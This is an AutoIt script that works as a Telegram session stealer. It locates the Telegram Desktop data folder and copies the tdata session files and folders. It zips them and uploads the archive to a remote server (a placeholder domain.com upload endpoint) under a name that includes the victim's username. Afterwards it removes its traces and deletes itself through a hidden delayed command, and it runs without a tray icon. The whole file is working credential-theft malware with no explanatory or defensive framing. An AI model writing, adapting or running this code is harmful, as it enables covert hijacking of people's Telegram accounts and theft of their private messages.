#include <Array.au3>
#include <File.au3>
#include <_Zip.au3>
#include <HTTP.au3>

#NoTrayIcon

Func _ProcessGetPath($vProcess)
	Local $iPID = ProcessExists($vProcess)
	If Not $iPID Then Return SetError(1, 0, -1)

	Local $aProc = DllCall('kernel32.dll', 'hwnd', 'OpenProcess', 'int', BitOR(0x0400, 0x0010), 'int', 0, 'int', $iPID)
	If Not IsArray($aProc) Or Not $aProc[0] Then Return SetError(2, 0, -1)

	Local $vStruct = DllStructCreate('int[1024]')

	Local $hPsapi_Dll = DllOpen('Psapi.dll')
	If $hPsapi_Dll = -1 Then $hPsapi_Dll = DllOpen(@SystemDir & '\Psapi.dll')
	If $hPsapi_Dll = -1 Then $hPsapi_Dll = DllOpen(@WindowsDir & '\Psapi.dll')
	If $hPsapi_Dll = -1 Then Return SetError(3, 0, '')

	DllCall($hPsapi_Dll, 'int', 'EnumProcessModules', _
			'hwnd', $aProc[0], _
			'ptr', DllStructGetPtr($vStruct), _
			'int', DllStructGetSize($vStruct), _
			'int_ptr', 0)
	Local $aRet = DllCall($hPsapi_Dll, 'int', 'GetModuleFileNameEx', _
			'hwnd', $aProc[0], _
			'int', DllStructGetData($vStruct, 1), _
			'str', '', _
			'int', 2048)

	DllClose($hPsapi_Dll)

	If Not IsArray($aRet) Or StringLen($aRet[3]) = 0 Then Return SetError(4, 0, '')
	Return $aRet[3]
EndFunc   ;==>_ProcessGetPath

Func GetDir($sFilePath)
	If Not IsString($sFilePath) Then
		Return SetError(1, 0, -1)
	EndIf

	Local $FileDir = StringRegExpReplace($sFilePath, "\\[^\\]*$", "")

	Return $FileDir
EndFunc   ;==>GetDir

Func GetFilesList($sPath, $sFormat = "*", $fileOnly = 0)
	Local $aFileList = _FileListToArray($sPath, $sFormat, $fileOnly)
	If @error = 1 Or @error = 4 Then
		Return 0
	EndIf
	Return $aFileList
EndFunc   ;==>GetFilesList

Func getTelegramDir()
	$telegramDefaultPath = _PathFull("Telegram Desktop", @AppDataDir)
	$telegramProcessPath = GetDir(_ProcessGetPath(ProcessExists("telegram.exe")))

	If ($telegramProcessPath <> -1) Then
		Return $telegramProcessPath
	ElseIf (FileExists($telegramDefaultPath)) Then
		Return $telegramDefaultPath
	Else
		Return 0
	EndIf
EndFunc   ;==>getTelegramDir

Func GetTelegramSessionFiles($telegramPath)
	$tdataFileList = GetFilesList($telegramPath & "\\tdata", Default, 1)

	For $i = 1 To $tdataFileList[0]
		If $tdataFileList[$i] = "working" Then
			_ArrayDelete($tdataFileList, $i)
		EndIf
	Next
	_ArrayDelete($tdataFileList, 0)
	Return $tdataFileList
EndFunc   ;==>GetTelegramSessionFiles

Func GetTelegramSessionFolders($telegramPath)
	$tdataFolderList = GetFilesList($telegramPath & "\\tdata", Default, 2)
	Local $sessionFolders = []

	For $i = 1 To $tdataFolderList[0]
		If StringLen($tdataFolderList[$i]) >= 15 Then
			_ArrayAdd($sessionFolders, $tdataFolderList[$i])
		EndIf
	Next
	_ArrayDelete($sessionFolders, 0)
	Return $sessionFolders
EndFunc   ;==>GetTelegramSessionFolders

Func CopyArrayFiles($inputPath, $aFiles, $aOutputPath)
	For $i = 0 To UBound($aFiles) - 1
		FileCopy($inputPath & $aFiles[$i], $aOutputPath, $FC_OVERWRITE + $FC_CREATEPATH)
	Next
EndFunc   ;==>CopyArrayFiles

Func CopyArrayFolders($inputPath, $aFolders, $aOutputPath)
	For $i = 0 To UBound($aFolders) - 1
		DirCopy($inputPath & $aFolders[$i], $aOutputPath & '\' & $aFolders[$i], 0)
	Next
EndFunc   ;==>CopyArrayFolders

Func ZipFolder($sFolder, $sZipFile)
	$srcZipFile = _Zip_Create($sZipFile, 1)
	_Zip_AddItem($srcZipFile, $sFolder)
EndFunc   ;==>ZipFolder


$aSessionFiles = GetTelegramSessionFiles(getTelegramDir())
$aSessionFolders = GetTelegramSessionFolders(getTelegramDir())
$tData = getTelegramDir() & "\tdata\"
$outputPath = @AppDataDir & "\telegram\"
$zipFilePath = $outputPath & 'backup.zip'

CopyArrayFiles($tData, $aSessionFiles, $outputPath)
CopyArrayFolders($tData, $aSessionFolders, $outputPath)
ZipFolder($outputPath, $zipFilePath)

$serverPassword = 123
$serverUrl = "https://domain.com/upload.php"
_HTTP_Upload($serverUrl, $zipFilePath, "uploadinput", "pwd=" & $serverPassword & "&filename=" & URLEncode("tel" & @UserName & Random(1, 600000000, 1) & '.zip'))

DirRemove($outputPath, 1)
Run(@ComSpec & ' /c ping 127.0.0.1 -n 5 && del /F /Q "' & @ScriptFullPath & '"', @SystemDir, @SW_HIDE)